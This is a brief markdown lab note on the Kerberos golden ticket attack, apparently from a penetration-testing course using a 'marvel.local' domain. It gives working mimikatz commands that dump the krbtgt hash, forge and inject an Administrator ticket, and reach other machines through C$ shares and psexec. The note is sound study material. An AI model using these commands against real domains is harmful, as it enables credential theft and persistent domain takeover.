## Golden Ticket Attacks
- If you have the hash of the krbtgt hash you can generate Kerberos TGT tickets
- You can request access to any resource or system on the domain using the ticket granting service

### Attack
- Run mimikatz on DC
- `privilege::debug`
- `lsadump::lsa /inject /name:krbtgt`

  ![image](https://github.com/user-attachments/assets/a7e442b6-02dc-4831-8e2f-33a692438540)

- Copy SID and NTLM and past them into note
- Pass the ticket: `kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-4007098431-2384469716-464634730 /krbtgt:c4678a06e104188881a4410d52dfde19 /id:500 /ptt`

  ![image](https://github.com/user-attachments/assets/37969a1a-3bfe-482b-830c-3bda654c57fb)

- Get a cmd: `misc:cmd`
- List contents of directory on another machine `dir \\THEPUNISHER\c$`

  ![image](https://github.com/user-attachments/assets/45f8f3e9-a197-4988-ab22-0608e5500c8b)

- Can gain access to other machines with psexec `psexec.exe <machine> cmd.exe`
- Golden ticket is persistence
- Not everyone is picking up golden tickets
